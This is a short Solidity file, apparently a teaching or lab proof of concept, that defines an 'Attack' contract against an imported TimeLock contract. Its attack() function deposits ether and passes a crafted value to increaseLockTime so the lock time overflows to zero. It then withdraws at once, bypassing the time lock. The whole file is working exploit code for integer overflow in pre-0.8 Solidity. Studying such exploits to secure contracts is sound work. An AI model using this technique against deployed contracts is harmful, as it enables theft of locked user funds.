// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import  "./TimeLock.sol";

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}


    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }


    function getBalance() public  view  returns (uint){
        return  address(this).balance;
    }

    

}